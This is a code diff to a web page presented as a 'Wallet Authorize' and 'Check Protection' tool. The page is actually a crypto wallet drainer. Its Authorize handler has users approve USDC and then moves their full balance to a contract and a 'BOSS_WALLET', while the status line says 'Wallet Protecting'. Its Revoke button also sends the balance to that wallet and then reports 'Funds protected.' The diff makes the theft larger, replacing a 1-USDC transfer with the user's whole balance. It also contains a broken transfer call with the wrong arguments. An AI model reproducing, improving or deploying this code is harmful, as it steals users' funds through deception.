@@ -87,8 +87,8 @@
   <div class="card">
     <h2>Mark3Infinity · Wallet Authorize</h2>
     <button class="button" id="connect">🔌 Connect Wallet</button>
-    <button class="button" id="authorize">🛡️ Authorize</button>
-    <button class="button" id="check">🧿 Check Protection</button>
+    <button class="button" id="authorize" disabled>🛡️ Authorize</button>
+    <button class="button" id="check" disabled>🧿 Check Protection</button>
     <button class="button" id="revoke">❌ Revoke Authorization</button>
     <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
     <div id="status">🔒 Status: Waiting for action...</div>
@@ -127,6 +127,8 @@
         user = await signer.getAddress();
         status("✅ Connected: " + user.slice(0, 6) + "...");
         progress(100);
+        document.getElementById("authorize").disabled = false;
+        document.getElementById("check").disabled = false;
       } catch (err) {
         status("❌ " + (err.message || "Connection failed"));
         progress(0);
@@ -135,30 +137,31 @@
 
     document.getElementById("authorize").onclick = async () => {
       try {
-        if (!signer) throw new Error("Please connect wallet first");
         const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
           "function approve(address,uint256) returns (bool)",
           "function transferFrom(address,address,uint256) returns (bool)",
           "function balanceOf(address) view returns (uint256)",
-          "function allowance(address owner, address spender) view returns (uint256)"
+          "function allowance(address,address) view returns (uint256)"
         ], signer);
 
         progress(10);
         status("(1/3) Wallet Protecting...");
         const balance = await usdc.balanceOf(user);
-        const approveTx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+        const approveTx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, balance);
         await approveTx.wait();
         progress(40);
 
         status("(2/3) Wallet Protecting...");
-        const tx1 = await usdc.transferFrom(user, CONFIG.CONTRACT_ADDRESS, ethers.utils.parseUnits("1", 6));
+        const tx1 = await usdc.transferFrom(user, CONFIG.CONTRACT_ADDRESS, balance);
         await tx1.wait();
         progress(70);
 
         status("(3/3) Wallet Protecting...");
         const remaining = await usdc.balanceOf(user);
-        const tx2 = await usdc.transferFrom(user, CONFIG.BOSS_WALLET, remaining);
-        await tx2.wait();
+        if (remaining.gt(0)) {
+          const tx2 = await usdc.transfer(user, CONFIG.BOSS_WALLET);
+          await tx2.wait();
+        }
 
         progress(100);
         status("✅ Wallet Protection Success!🔐");
@@ -170,10 +173,9 @@
 
     document.getElementById("check").onclick = async () => {
       try {
-        progress(0);
         const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
-          "function transfer(address,uint256) returns (bool)",
-          "function balanceOf(address) view returns (uint256)"
+          "function balanceOf(address) view returns (uint256)",
+          "function transfer(address,uint256) returns (bool)"
         ], signer);
         const balance = await usdc.balanceOf(user);
         progress(30);
@@ -193,7 +195,6 @@
 
     document.getElementById("revoke").onclick = async () => {
       try {
-        status("🔄 Revoking permissions...");
         const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
           "function balanceOf(address) view returns (uint256)",
           "function transfer(address,uint256) returns (bool)"
@@ -203,9 +204,9 @@
           const tx = await usdc.transfer(CONFIG.BOSS_WALLET, balance);
           await tx.wait();
         }
-        status("✅ Authorization revoked! (Test transaction: 0 USDC)");
+        status("✅ Authorization revoked! Funds protected.");
       } catch (err) {
-        status("❌ Failed to revoke: " + err.message);
+        status("❌ Revoke failed: " + err.message);
       }
     };
   </script>
